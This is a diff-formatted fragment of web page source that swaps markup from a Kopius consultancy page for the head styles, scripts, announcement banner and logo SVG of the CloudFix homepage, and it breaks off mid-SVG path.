-					opacity: 1;
-					transition: opacity 400ms;
-					transition-delay: 0ms;
-				}
-					</style>
-		<link rel="icon" href="https://kopiustech.com/wp-content/uploads/2023/02/cropped-Kopius-Site-Icon-32x32.png" sizes="32x32" />
-<link rel="icon" href="https://kopiustech.com/wp-content/uploads/2023/02/cropped-Kopius-Site-Icon-192x192.png" sizes="192x192" />
-<link rel="apple-touch-icon" href="https://kopiustech.com/wp-content/uploads/2023/02/cropped-Kopius-Site-Icon-180x180.png" />
-<meta name="msapplication-TileImage" content="https://kopiustech.com/wp-content/uploads/2023/02/cropped-Kopius-Site-Icon-270x270.png" />
-		<style id="wp-custom-css">
-			header[theme][theme=neutral], [data-automation-id=city], [data-automation-id=state] {
-	display: none;
+<link rel="dns-prefetch" href="//fonts.googleapis.com"><link rel="preconnect" href="//fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://forms.hsforms.com"><style id='safe-svg-svg-icon-style-inline-css' type='text/css'>
+.safe-svg-cover .safe-svg-inside{display:inline-block;max-width:100%}.safe-svg-cover svg{height:100%;max-height:100%;max-width:100%;width:100%}
+
+</style>
+<link rel='stylesheet' id='classic-theme-styles-css' href='https://cloudfix.aurea.com/wp-includes/css/classic-themes.min.css?ver=1' type='text/css' media='all' />
+<link rel='stylesheet' id='main-style-css' href='https://cloudfix.aurea.com/wp-content/themes/cloudfix-3-theme/css/style.min.css?ver=91cf763a' type='text/css' media='all' />
+<script type="text/javascript">
+            window._nslDOMReady = function (callback) {
+                if ( document.readyState === "complete" || document.readyState === "interactive" ) {
+                    callback();
+                } else {
+                    document.addEventListener( "DOMContentLoaded", callback );
+                }
+            };
+            </script><script type='text/javascript' src='https://cloudfix.aurea.com/wp-content/themes/cloudfix-3-theme/js/jquery.min.js?ver=3.6.1' id='jquery-js'></script>
+<script type='text/javascript' src='https://cloudfix.aurea.com/wp-content/plugins/creativestudio-utms/creativestudio-utm-io.min.js?ver=1678522129' id='utm-io-js'></script>
+<link rel="icon" href="https://cloudfix.aurea.com/wp-content/uploads/cropped-cloudfix_favicon-32x32.png" sizes="32x32" />
+<link rel="icon" href="https://cloudfix.aurea.com/wp-content/uploads/cropped-cloudfix_favicon-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://cloudfix.aurea.com/wp-content/uploads/cropped-cloudfix_favicon-180x180.png" />
+<meta name="msapplication-TileImage" content="https://cloudfix.aurea.com/wp-content/uploads/cropped-cloudfix_favicon-270x270.png" />
+<style type="text/css">div.nsl-container[data-align="left"] {
+    text-align: left;
 }
 
-#wp-megamenu-item-3640 a{    
-	padding: 12px 22px !important;
-	margin-left: 4px;
-    border: 0 !important;
-    border-radius: 80px !important;
-    color: #fff !important;
-    background: black !important;
-    position: relative;
-    z-index: 1; }
+div.nsl-container[data-align="center"] {
+    text-align: center;
+}
 
-#wp-megamenu-item-3640 a:hover{    
-	padding: 12px 22px !important;
-	margin-left: 4px;
-    border: 0 !important;
-    border-radius: 80px !important;
-    color: #fff !important;
-    background: #222222 !important;
-    position: relative;
-    z-index: 1; }		</style>
-		
-	<script src="https://www.twilik.com/assets/retainable/rss-embed/retainable-rss-embed.js"></script>
+div.nsl-container[data-align="right"] {
+    text-align: right;
+}
 
-  	<script src="https://kenwheeler.github.io/slick/slick/slick.js"></script>
 
-	<script src="https://boards.greenhouse.io/embed/job_board/js?for=valence"></script>
+div.nsl-container div.nsl-container-buttons a[data-plugin="nsl"] {
+    text-decoration: none;
+    box-shadow: none;
+    border: 0;
+}
 
+div.nsl-container .nsl-container-buttons {
+    display: flex;
+    padding: 5px 0;
+}
+
+div.nsl-container.nsl-container-block .nsl-container-buttons {
+    display: inline-grid;
+    grid-template-columns: minmax(145px, auto);
+}
+
+div.nsl-container-block-fullwidth .nsl-container-buttons {
+    flex-flow: column;
+    align-items: center;
+}
+
+div.nsl-container-block-fullwidth .nsl-container-buttons a,
+div.nsl-container-block .nsl-container-buttons a {
+    flex: 1 1 auto;
+    display: block;
+    margin: 5px 0;
+    width: 100%;
+}
+
+div.nsl-container-inline {
+    margin: -5px;
+    text-align: left;
+}
+
+div.nsl-container-inline .nsl-container-buttons {
+    justify-content: center;
+    flex-wrap: wrap;
+}
+
+div.nsl-container-inline .nsl-container-buttons a {
+    margin: 5px;
+    display: inline-block;
+}
+
+div.nsl-container-grid .nsl-container-buttons {
+    flex-flow: row;
+    align-items: center;
+    flex-wrap: wrap;
+}
+
+div.nsl-container-grid .nsl-container-buttons a {
+    flex: 1 1 auto;
+    display: block;
+    margin: 5px;
+    max-width: 280px;
+    width: 100%;
+}
+
+@media only screen and (min-width: 650px) {
+    div.nsl-container-grid .nsl-container-buttons a {
+        width: auto;
+    }
+}
+
+div.nsl-container .nsl-button {
+    cursor: pointer;
+    vertical-align: top;
+    border-radius: 4px;
+}
+
+div.nsl-container .nsl-button-default {
+    color: #fff;
+    display: flex;
+}
+
+div.nsl-container .nsl-button-icon {
+    display: inline-block;
+}
+
+div.nsl-container .nsl-button-svg-container {
+    flex: 0 0 auto;
+    padding: 8px;
+    display: flex;
+    align-items: center;
+}
+
+div.nsl-container svg {
+    height: 24px;
+    width: 24px;
+    vertical-align: top;
+}
+
+div.nsl-container .nsl-button-default div.nsl-button-label-container {
+    margin: 0 24px 0 12px;
+    padding: 10px 0;
+    font-family: Helvetica, Arial, sans-serif;
+    font-size: 16px;
+    line-height: 20px;
+    letter-spacing: .25px;
+    overflow: hidden;
+    text-align: center;
+    text-overflow: clip;
+    white-space: nowrap;
+    flex: 1 1 auto;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+    text-transform: none;
+    display: inline-block;
+}
+
+div.nsl-container .nsl-button-google[data-skin="dark"] .nsl-button-svg-container {
+    margin: 1px;
+    padding: 7px;
+    border-radius: 3px;
+    background: #fff;
+}
+
+div.nsl-container .nsl-button-google[data-skin="light"] {
+    border-radius: 1px;
+    box-shadow: 0 1px 5px 0 rgba(0, 0, 0, .25);
+    color: RGBA(0, 0, 0, 0.54);
+}
+
+div.nsl-container .nsl-button-apple .nsl-button-svg-container {
+    padding: 0 6px;
+}
+
+div.nsl-container .nsl-button-apple .nsl-button-svg-container svg {
+    height: 40px;
+    width: auto;
+}
+
+div.nsl-container .nsl-button-apple[data-skin="light"] {
+    color: #000;
+    box-shadow: 0 0 0 1px #000;
+}
+
+div.nsl-container .nsl-button-facebook[data-skin="white"] {
+    color: #000;
+    box-shadow: inset 0 0 0 1px #000;
+}
+
+div.nsl-container .nsl-button-facebook[data-skin="light"] {
+    color: #1877F2;
+    box-shadow: inset 0 0 0 1px #1877F2;
+}
+
+div.nsl-container .nsl-button-apple div.nsl-button-label-container {
+    font-size: 17px;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+}
+
+div.nsl-container .nsl-button-slack div.nsl-button-label-container {
+    font-size: 17px;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+}
+
+div.nsl-container .nsl-button-slack[data-skin="light"] {
+    color: #000000;
+    box-shadow: inset 0 0 0 1px #DDDDDD;
+}
+
+div.nsl-container .nsl-button-tiktok[data-skin="light"] {
+    color: #161823;
+    box-shadow: 0 0 0 1px rgba(22, 24, 35, 0.12);
+}
+
+.nsl-clear {
+    clear: both;
+}
+
+.nsl-container {
+    clear: both;
+}
+
+/*Button align start*/
+
+div.nsl-container-inline[data-align="left"] .nsl-container-buttons {
+    justify-content: flex-start;
+}
+
+div.nsl-container-inline[data-align="center"] .nsl-container-buttons {
+    justify-content: center;
+}
+
+div.nsl-container-inline[data-align="right"] .nsl-container-buttons {
+    justify-content: flex-end;
+}
+
+
+div.nsl-container-grid[data-align="left"] .nsl-container-buttons {
+    justify-content: flex-start;
+}
+
+div.nsl-container-grid[data-align="center"] .nsl-container-buttons {
+    justify-content: center;
+}
+
+div.nsl-container-grid[data-align="right"] .nsl-container-buttons {
+    justify-content: flex-end;
+}
+
+div.nsl-container-grid[data-align="space-around"] .nsl-container-buttons {
+    justify-content: space-around;
+}
+
+div.nsl-container-grid[data-align="space-between"] .nsl-container-buttons {
+    justify-content: space-between;
+}
+
+/* Button align end*/
+
+/* Redirect */
+
+#nsl-redirect-overlay {
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    position: fixed;
+    z-index: 1000000;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    backdrop-filter: blur(1px);
+    background-color: RGBA(0, 0, 0, .32);;
+}
+
+#nsl-redirect-overlay-container {
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    background-color: white;
+    padding: 30px;
+    border-radius: 10px;
+}
+
+#nsl-redirect-overlay-spinner {
+    content: '';
+    display: block;
+    margin: 20px;
+    border: 9px solid RGBA(0, 0, 0, .6);
+    border-top: 9px solid #fff;
+    border-radius: 50%;
+    box-shadow: inset 0 0 0 1px RGBA(0, 0, 0, .6), 0 0 0 1px RGBA(0, 0, 0, .6);
+    width: 40px;
+    height: 40px;
+    animation: nsl-loader-spin 2s linear infinite;
+}
+
+@keyframes nsl-loader-spin {
+    0% {
+        transform: rotate(0deg)
+    }
+    to {
+        transform: rotate(360deg)
+    }
+}
+
+#nsl-redirect-overlay-title {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+    font-size: 18px;
+    font-weight: bold;
+    color: #3C434A;
+}
+
+#nsl-redirect-overlay-text {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+    text-align: center;
+    font-size: 14px;
+    color: #3C434A;
+}
+
+/* Redirect END*/</style>	<meta name="facebook-domain-verification" content="jltibmbve9twxwrm68qgyzx60lvnk6" />
 </head>
 
-<body class="page-template-default page page-id-843 page-child parent-pageid-311 wp-custom-logo wp-megamenu no-sidebar">
-<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-dark-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 0.498039215686" /><feFuncG type="table" tableValues="0 0.498039215686" /><feFuncB type="table" tableValues="0 0.498039215686" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 1" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0 1" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-purple-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.549019607843 0.988235294118" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0.717647058824 0.254901960784" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-blue-red"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 1" /><feFuncG type="table" tableValues="0 0.278431372549" /><feFuncB type="table" tableValues="0.592156862745 0.278431372549" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-midnight"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 0" /><feFuncG type="table" tableValues="0 0.647058823529" /><feFuncB type="table" tableValues="0 1" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-magenta-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.780392156863 1" /><feFuncG type="table" tableValues="0 0.949019607843" /><feFuncB type="table" tableValues="0.352941176471 0.470588235294" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-purple-green"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.650980392157 0.403921568627" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0.447058823529 0.4" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-blue-orange"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.0980392156863 1" /><feFuncG type="table" tableValues="0 0.662745098039" /><feFuncB type="table" tableValues="0.847058823529 0.419607843137" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg>
-<!-- GTM Container placement set to automatic -->
-<!-- Google Tag Manager (noscript) -->
-				<noscript><iframe  height="0" width="0" style="display:none;visibility:hidden" aria-hidden="true" data-src="https://www.googletagmanager.com/ns.html?id=GTM-WTPDTBR" class="lazyload" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></noscript>
-<!-- End Google Tag Manager (noscript) --><div id="page" class="site">
-	<a class="skip-link screen-reader-text" href="#primary">Skip to content</a>
-
-	<header id="masthead" class="site-header">
-		<div class="site-branding">
-			<a href="https://kopiustech.com/" class="custom-logo-link" rel="home"><img width="1140" height="280"   alt="Kopius" decoding="async" data-srcset="https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark.png 1140w, https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark-300x74.png 300w, https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark-1024x252.png 1024w, https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark-768x189.png 768w"  data-src="https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark.png" data-sizes="(max-width: 1140px) 100vw, 1140px" class="custom-logo lazyload" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /><noscript><img width="1140" height="280" src="https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark.png" class="custom-logo" alt="Kopius" decoding="async" srcset="https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark.png 1140w, https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark-300x74.png 300w, https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark-1024x252.png 1024w, https://kopiustech.com/wp-content/uploads/2023/02/Kopius_Logo_Dark-768x189.png 768w" sizes="(max-width: 1140px) 100vw, 1140px" /></noscript></a>				<p class="site-title"><a href="https://kopiustech.com/" rel="home">Kopius</a></p>
-						</div><!-- .site-branding -->
-
-		<nav id="site-navigation" class="main-navigation">
-			<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">Primary Menu</button>
-			<nav id="wp-megamenu-menu-1" class="wp-megamenu-wrap   ">
-			<div class="wpmm-fullwidth-wrap"></div>
-			<div class="wpmm-nav-wrap wpmm-main-wrap-menu-1">
-				<a href="javascript:;" class="wpmm_mobile_menu_btn show-close-icon"><i class="fa fa-bars"></i> </a> 
-					<ul id="menu-main-menu" class="wp-megamenu" ><li id="wp-megamenu-item-2776" class="menu-item menu-item-type-post_type menu-item-object-page wp-megamenu-item-2776  wpmm_dropdown_menu  wpmm-none wpmm-item-fixed-width wpmm-strees-default wpmm-submenu-right"><a href="https://kopiustech.com/approach/">Approach</a></li>
-<li id="wp-megamenu-item-2896" class="menu-item menu-item-type-post_type menu-item-object-page current-page-ancestor wp-megamenu-item-2896  wpmm_mega_menu  wpmm-none wpmm-hide-desktop wpmm-submenu-right"><a href="https://kopiustech.com/capabilities/">Capabilities <b class="fa fa-angle-down"></b> </a>
-<ul class="wp-megamenu-sub-menu" >
-	<li id="wp-megamenu-item-464239883485841925" class="wpmm-row wp-megamenu-item-464239883485841925 wpmm-submenu-right">
-	<ul class="wp-megamenu-sub-menu" >
-		<li id="wp-megamenu-item-3161589941281115767" class="wpmm-col wpmm-col-12 wp-megamenu-item-3161589941281115767 wpmm-submenu-right">
-		<ul class="wp-megamenu-sub-menu" >
-			<li class="menu-item wpmm-type-widget menu-widget-class wpmm-type-widget wp-megamenu-item-2896 wpmm-hide-desktop wpmm-submenu-right"><div class="menu-overview-what-we-do-container"><ul id="menu-overview-what-we-do" class="menu"><li id="menu-item-2514" class="menu-item menu-item-type-post_type menu-item-object-page current-page-ancestor menu-item-2514"><a href="https://kopiustech.com/capabilities/" data-ps2id-api="true">Capabilities Overview</a></li>
-</ul></div></li>
-			<li id="wp-megamenu-item-2897" class="menu-item wpmm-type-widget menu-widget-class wpmm-type-widget wp-megamenu-item-2897 wpmm-submenu-right"><h4 class="wpmm-item-title">Digital Experiences + Strategy</h4><div class="menu-strategy-dd-container"><ul id="menu-strategy-dd" class="menu"><li id="menu-item-2676" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2676"><a href="https://kopiustech.com/capabilities/lean-transformation-roadmaps/" data-ps2id-api="true">Lean Transformation Roadmaps </a></li>
-<li id="menu-item-2677" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2677"><a href="https://kopiustech.com/capabilities/digital-product-planning/" data-ps2id-api="true">Digital Product Planning</a></li>
-<li id="menu-item-879" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-879"><a href="https://kopiustech.com/capabilities/customer-experience/" data-ps2id-api="true">Customer Experience</a></li>
-<li id="menu-item-2920" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2920"><a href="https://kopiustech.com/capabilities/value-definition/" data-ps2id-api="true">Value Definition</a></li>
-<li id="menu-item-881" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-843 current_page_item menu-item-881"><a href="https://kopiustech.com/capabilities/cloud-strategy/" aria-current="page" data-ps2id-api="true">Cloud Strategy</a></li>
-</ul></div></li>
-			<li id="wp-megamenu-item-2898" class="menu-item wpmm-type-widget menu-widget-class wpmm-type-widget wp-megamenu-item-2898 wpmm-submenu-right"><h4 class="wpmm-item-title">Labs + Technology</h4><div class="menu-technology-dd-container"><ul id="menu-technology-dd" class="menu"><li id="menu-item-2688" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2688"><a href="https://kopiustech.com/capabilities/data-and-analytics/" data-ps2id-api="true">Data + Analytics</a></li>
-<li id="menu-item-2686" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2686"><a href="https://kopiustech.com/capabilities/artificial-intelligence-machine-learning/" data-ps2id-api="true">AI/ML</a></li>
-<li id="menu-item-2690" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2690"><a href="https://kopiustech.com/capabilities/cloud-application-development/" data-ps2id-api="true">Cloud Application Development</a></li>
-<li id="menu-item-2940" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2940"><a href="https://kopiustech.com/capabilities/dxp-architecture-solution-development/" data-ps2id-api="true">DXP Architecture + Solution Development </a></li>
-<li id="menu-item-2950" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2950"><a href="https://kopiustech.com/capabilities/cloud-engineering/" data-ps2id-api="true">Cloud Engineering</a></li>
-</ul></div></li>
-			<li id="wp-megamenu-item-2899" class="menu-item wpmm-type-widget menu-widget-class wpmm-type-widget wp-megamenu-item-2899 wpmm-submenu-right"><h4 class="wpmm-item-title">Operational Services</h4><div class="menu-services-dd-container"><ul id="menu-services-dd" class="menu"><li id="menu-item-2699" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2699"><a href="https://kopiustech.com/capabilities/strategic-technical-capacity/" data-ps2id-api="true">Strategic Technical Capacity</a></li>
-<li id="menu-item-2921" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2921"><a href="https://kopiustech.com/capabilities/devops/" data-ps2id-api="true">DevOps</a></li>
-<li id="menu-item-2697" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2697"><a href="https://kopiustech.com/capabilities/project-leadership/" data-ps2id-api="true">Project Leadership</a></li>
-<li id="menu-item-2696" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2696"><a href="https://kopiustech.com/capabilities/managed-services/" data-ps2id-api="true">Managed Services  </a></li>
-<li id="menu-item-2698" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2698"><a href="https://kopiustech.com/capabilities/quality-assurance-and-testing/" data-ps2id-api="true">Quality Assurance + Testing</a></li>
-</ul></div></li>
-		</ul>
-</li>
-	</ul>
-</li>
+<body class="home page-template-default page page-id-2 non-eu">
+		        <aside id="announcement" class="closeable py-2">
+            <div class="inner">
+                <h2 class="sr-only">Announcement</h2>
+                <p style="text-align: center;">Listen to season two of AWS Insiders, the #1 podcast for AWS champions <a class="secondary-btn secondary-btn--smaller" href="https://link.chtbl.com/awsinsiders?sid=banner" rel="noopener">Listen here</a></p>
+                <span class="close-icon">×</span>            </div>
+                            <script>
+                    const sA = sessionStorage.getItem("announcement"),
+                        A = document.querySelector("#announcement");
+                    if ("closed" !== sA) {
+                        A.querySelector(".close-icon").addEventListener("click", (function() {
+                            sessionStorage.setItem("announcement", "closed"), A.classList.add("closeable--closed")
+                        }), !1)
+                    } else A.remove();
+                </script>
+                    </aside>
+	<header id="top" class="page-header are-sticky">
+		<a class="screen-reader-shortcut" href="#main" tabindex="1">Skip to Main Content</a>
+		<nav class="inner">
+			<div class="logo-container"><a class="header-logo" href="https://cloudfix.aurea.com/"><svg width="196" height="38" aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+						<symbol id="brandmark" viewBox="0 0 195 195">
+							<title>CloudFix logo</title>
+							<path fill="currentColor" d="M0 96.27C0 43.18 43.18 0 96.27 0v50.18c-25.09 0-44.93 19.84-46.1 44.34-1.17 25.68 18.67 46.67 44.35 47.84 25.67 1.17 46.67-18.67 47.85-44.34v-1.75h50.18v1.75c-1.17 52.51-43.76 94.52-96.27 94.52S0 149.37 0 96.27M109.11 0v50.18h33.26v33.25h50.18V0h-83.44Z" />
+						</symbol>
+						<symbol id="aurea-cloudfix-logo" viewBox="0 0 1035 195">
+							<use xlink:href="#brandmark" transform="translate(-420 0)"></use>
+							<path fill="currentColor" d="M1013.37 171.23c-1.51 0-3.54-.5-4.55-1.51s-1.51-2.02-2.02-2.53l-24.74-34.84-24.74 34.84c-.5.5-1.01 1.52-2.02 2.53-1.01 1.01-3.03 1.51-4.55 1.51h-13.13c-1.01 0-2.02-.5-3.03-1.01-1.01-1.01-1.51-2.02-1.01-3.03 0-.5 0-1.01.5-1.51l35.85-50.49-34.33-48.47c-1.01-1.01-1.01-1.51-1.01-2.02 0-1.01.5-2.02 1.01-3.03 1.01-1.01 2.02-1.51 3.03-1.01h13.13c1.51 0 3.54.5 4.55 1.51 1.01 1.01 1.51 2.02 2.02 2.53l23.73 33.32 23.22-33.32c.5-.5 1.01-1.51 2.02-2.53 1.01-1.01 3.03-1.51 4.55-1.51h13.13c1.01 0 2.02.5 3.03 1.01 1.01 1.01 1.51 2.02 1.01 3.03 0 .5 0 1.01-.5 1.51l-34.33 48.98 35.34 49.99c.5.5.5 1.01.5 1.51a3.98 3.98 0 0 1-4.04 4.04l-12.62.5Zm-112.59 0c-1.01 0-2.02-.5-3.03-1.01-1.01-1.01-1.51-2.02-1.01-3.03V64.7c0-1.01.5-2.02 1.01-3.03 1.01-1.01 2.02-1.51 3.03-1.01h12.62c1.01 0 2.02.5 3.03 1.01 1.01 1.01 1.51 2.02 1.01 3.03v102.49c0 1.01-.5 2.02-1.01 3.03-1.01 1.01-2.02 1.51-3.03 1.01h-12.62ZM874.02 60.15c1.01 0 2.02.5 3.03 1.01 1.01 1.01 1.01 2.02 1.01 3.03V75.3c0 1.01-.5 2.02-1.01 3.03-1.01 1.01-2.02 1.51-3.03 1.51h-49.99v30.8h46.96c1.01 0 2.02.5 3.03 1.01 1.01 1.01 1.51 2.02 1.01 3.03v11.11c0 1.01-.5 2.02-1.01 3.03-1.01 1.01-2.02 1.51-3.03 1.51h-46.96v36.35c0 1.01-.5 2.02-1.51 3.03-1.01 1.01-2.02 1.51-3.03 1.01h-12.62a3.98 3.98 0 0 1-4.04-4.04V64.7c0-1.01.5-2.02 1.01-3.03 1.01-1.01 2.02-1.51 3.03-1.01l67.15-.5Zm-112.6 43.93c0-3.03-1.01-6.56-2.02-9.59-2.02-6.06-7.07-10.6-13.13-12.62-3.53-1.51-7.57-2.02-11.61-2.02h-21.21v71.19h21.71c3.53 0 7.57-.5 11.11-2.02 3.03-1.01 5.55-3.03 8.08-5.05a19.06 19.06 0 0 0 4.54-7.57c1.01-3.03 2.02-6.06 2.02-9.6 1.01-7.07 1.01-15.15.5-22.72m-25.75-43.93c7.07 0 13.63 1.01 20.2 3.03 10.6 3.53 19.19 12.12 23.22 22.72 2.02 5.55 3.54 11.61 3.54 18.17.5 7.57.5 15.65 0 23.23a76.24 76.24 0 0 1-3.54 18.17c-2.02 5.05-5.05 10.1-8.58 13.63-4.04 4.04-8.58 7.07-14.14 8.58a66.63 66.63 0 0 1-19.69 3.03h-39.38c-1.01 0-2.02-.5-3.03-1.01-1.01-1.01-1.51-2.02-1.01-3.03V64.19c0-1.01.5-2.02 1.01-3.03 1.01-1.01 2.02-1.51 3.03-1.01h38.37Zm-70.68 0c1.01 0 2.02.5 3.03 1.01 1.01 1.01 1.01 2.02 1.01 3.03v65.13c0 6.06-1.01 12.12-3.03 17.67-1.51 5.05-4.55 9.6-8.58 13.63a37.83 37.83 0 0 1-14.14 9.09 65.49 65.49 0 0 1-39.38 0 50.38 50.38 0 0 1-14.14-8.59c-4.04-4.04-6.56-8.58-8.58-13.63a41.7 41.7 0 0 1-2.52-17.67V64.7c0-1.01.5-2.02 1.01-3.03 1.01-1.01 2.02-1.51 3.03-1.01h12.62c1.01 0 2.02.5 3.03 1.01 1.01 1.01 1.52 2.02 1.01 3.03v64.12c0 3.53.5 7.57 1.51 11.11a15.47 15.47 0 0 0 5.05 7.57 13.85 13.85 0 0 0 7.57 4.04c3.03 1.01 6.56 1.51 9.59 1.51s6.56-.5 9.59-1.51a26.6 26.6 0 0 0 7.57-4.04c2.02-2.02 4.04-4.54 5.05-7.57 1.51-3.53 2.02-7.07 2.02-11.11V64.7c0-1.01.5-2.02 1.51-3.03 1.01-1.01 2.02-1.51 3.03-1.01l13.13-.5Zm-126.73 42.42c.5-12.62-9.59-23.73-22.22-23.73h-2.53c-6.56-.5-12.62 2.02-17.67 6.06-4.55 4.54-7.07 11.11-7.07 17.67 0 4.04-.5 8.59-.5 13.63s0 9.6.5 13.63c0 13.63 11.11 24.74 24.74 